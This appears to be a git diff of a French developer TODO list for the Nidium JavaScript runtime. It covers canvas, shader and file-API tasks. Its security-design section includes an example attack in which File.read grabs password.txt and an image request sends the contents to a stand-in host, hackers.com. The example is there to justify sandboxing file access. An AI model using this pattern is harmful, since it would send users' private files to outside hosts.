@@ -1,78 +1,83 @@
 /*
 	Today :
-		- faire que attachFragmentShader tiennent compte du padding
+
+		- NML basics + include
+		- donner texture du dessous au shader;
+		- canvas.blur(0, 1 ... 4);
+
 
 	CANVAS :
-		- donner texture du dessous au shader;
-
-		- canvas.blur(0, 1 ... 4);
-		- canvas.toDataURL();
 		- canvas.toArrayBuffer();
 		- window.canvas.snapshot(x, y, w, h);
 		- import des fontes
 
-	- cabler window.devicePixelRatio
 
 	SECURITY DESIGN :
-		- créer base de donnée local
-		- dedans, créer une clé de config nommée localFileAccess : "/shared/"
-		- restraindre API File dans un dossier
+		- restraindre API File dans le dossier definie par localFileAccess
 
 		- les appels à File.read("config.bin") --> dist/shared/config.bin
+
 		- Nidium Malicious Bacon Attack :
-			var m = File.read("password.txt", function(e){
+			var m = File.read("password.txt", function(data, size){
 				var i = new Image();
-				t.src = "http://www.hackers.com/content="+URLencode(e.data);
+				t.src = "http://www.hackers.com/content="+URLencode(data);
 			});
 
-	IMPACT SIGNIFICATIF SUR LE FRAMEWORK :
-		- outline
-
-
-	API FILE :
+	FINITIONS
 		- Callback d'érreur si le fichier ne peux pas être ouvert (404 http, fichier local inexistant, etc..)
+
+
+	IMPACT SIGNIFICATIF :
+		- Gestion du cache
 
 	CRASH :
 		- bug des gradients (crash)
-		- thread crash
 		- showFPS(true) crash au refresh
 
-	STRAIGHTFORWAD
-		- subtlepatterns.com (contacter et rajouter crédit)
-
 	THREADS AND WORKER
+		- thread crash
 		- Synchronous File API in Thread
-		- API Worker + rajouter console+include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)
-
-	COMPLEXE
-		- scale
-		- Gestion du cache
-		- NML basics + include
-		- nss can not be empty and must have minimum {} in it
-		- window.resize
+		- API Worker + rajouter include (voir ça https://github.com/astro/bitford/blob/master/src/sha1-worker.js)
 
 	STEALTH INVISIBLE MODE :
 		- 512Mo Ramdisk
 		- Cleanup Destruction on quit
 
+	COMPLEXE : 
+		- scale
+
+	VERY LOW PRIORITY : 
+		- ctx.outlineBlur = 5;
+		- ctx.outlineColor = "blue";
+		- nss can not be empty and must have minimum {} in it
+		- subtlepatterns.com : contacter (DONE) et rajouter le crédit
+		- window.resize
+
 ------
 DONE :
 ------
 
+	DAY 5:
+	- window.storage.set (sync)
+	- window.storage.get (sync)
+
 	DAY 4:
+	- shader ne suit pas le coin haut gauche du layer (DONE)
+	- faire que attachFragmentShader tiennent compte du padding (DONE)
 	- Work with Nico : crash au start sur linux (maybe font / skia)
-	- shader ne suit pas le coin haut gauche du layer
+	- Bug Gradient UIOption (DONE)
+	- cabler window.devicePixelRatio (WIP)
 
 	DAY 3:
-	- Stream API: getFileSize (distant + locaux)
-	- Stream API: seek (distant + locaux)
-	- Stream API: Implémenter NativeStream::stop()
-	- cabler canvas.attachFragmentShader();
-	- cabler canvas.detachFragmentShader();
+	- Stream API: getFileSize (distant + locaux) (DONE)
+	- Stream API: seek (distant + locaux) (DONE)
+	- Stream API: Implémenter NativeStream::stop() (DONE)
+	- cabler canvas.attachFragmentShader(); (DONE)
+	- cabler canvas.detachFragmentShader(); (DONE)
 
 	DAY 2
 	- renommer Native.canvas en window.canvas (main canvas)
-	- Stream API WIP
+	- Stream API Design + WIP
 
 	DAY 1
 	- corriger textAlign vertical (center) (DONE)
@@ -128,7 +133,7 @@ DONE :
 //load("applications/canvas/sand.js");
 //load("applications/canvas/bluewheel.js"); // fail
 //load("applications/canvas/cube.js"); // chute de perf VS premières versions 
-load("applications/canvas/cubewall.js"); // RAS
+//load("applications/canvas/cubewall.js"); // RAS
 //load("applications/canvas/flamme.js"); // OK
 //load("applications/canvas/particles.js"); // slow
 //load("applications/canvas/text.js"); // OK
@@ -159,7 +164,7 @@ load("applications/canvas/cubewall.js"); // RAS
 
 /* SHADERS */
 
-	//load("applications/components/shader.js"); // OK
+	load("applications/components/shader.js"); // OK
 	//load("applications/components/shader.basic.js"); // TODO : relative path to app
 	//load("applications/components/shader.advanced.js"); // TODO : relative path to app
 
@@ -191,3 +196,4 @@ load("applications/canvas/cubewall.js"); // RAS
 /* -- Native Debugger ------------------ */
 
 //load("applications/NatBug.nap");
+
